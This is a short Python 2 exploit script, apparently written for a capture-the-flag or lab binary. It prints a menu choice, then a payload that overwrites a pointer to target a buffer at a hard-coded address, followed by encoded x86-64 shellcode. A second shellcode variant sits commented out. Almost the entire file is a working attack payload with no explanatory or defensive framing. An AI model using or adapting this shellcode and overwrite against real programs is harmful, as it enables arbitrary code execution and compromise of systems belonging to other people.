#!/usr/bin/python

# buf is located at 0x6010c0
# we need a pointer to buf + 8
# and reverse it because it's read that way
# 0x6010c0 + 8 = 0x6010c8

print "9"


#buf  = "1 2 0 0 "
buf  = "\xc8\x10\x60\x00\x00\x00\x00\x00" #address to where shellcode

buf += "\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\xbb\xe4\xfc\x46\xad\x7e\x09"
buf += "\xec\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\xd1\xdf\xa4\xdf\xe5\xc5\x26\x8e\xd2\x8a\xd3\x35\xc5"
buf += "\x7e\x5a\xa4\x32\x03\x94\x6b\xce\x7e\x09\xa4\x32\x02"
buf += "\xae\xae\xbd\x7e\x09\xec\x94\x86\x95\x28\x82\x1b\x6a"
buf += "\x84\xd4\xc4\x8c\x31\xc3\x1b\x6d\xec\xed\xb3\xb4\xcf"
buf += "\x4b\x71\x0c\xec"

#buf += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
#buf += "\xef\xff\xff\xff\x48\xbb\x3b\xfb\xed\x40\xb4\xfb\x71"
#buf += "\x01\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
#buf += "\x51\xc0\xb5\xd9\xfc\x40\x5e\x63\x52\x95\xc2\x33\xdc"
#buf += "\xfb\x22\x49\xb2\x1c\x85\x6d\xd7\xfb\x71\x49\xb2\x1d"
#buf += "\xbf\xa8\xbc\xfb\x71\x01\x14\x99\x84\x2e\x9b\x88\x19"
#buf += "\x01\x6d\xac\xa5\xc9\x52\xf4\x74\x01"

buf += "\n"


print buf


